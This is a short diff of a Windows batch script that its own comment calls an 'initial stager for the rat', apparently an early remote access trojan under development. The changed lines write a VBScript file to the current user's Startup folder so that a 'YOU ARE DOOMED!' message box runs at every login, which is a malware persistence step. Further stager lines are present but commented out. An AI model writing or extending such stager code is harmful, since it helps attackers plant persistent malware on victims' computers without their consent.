@@ -2,9 +2,13 @@
 
 @rem initial stager for the rat
 
-cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
-(echo MsgBox "YOU ARE DOOMED!" ^& vbCrLf ^& "NOT WORTH IT", vbOkOnly+vbExclamation+vbDefaultButton1, "TITLE")>popup.vbs
+@rem variables
+path = C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+@rem write the payload to startup
+(echo MsgBox "YOU ARE DOOMED!" ^& vbCrLf ^& "NOT WORTH IT", vbOkOnly+vbExclamation+vbDefaultButton1, "TITLE")>%path%/popup.vbs
 
 @REM (
 @REM     echo @echo off
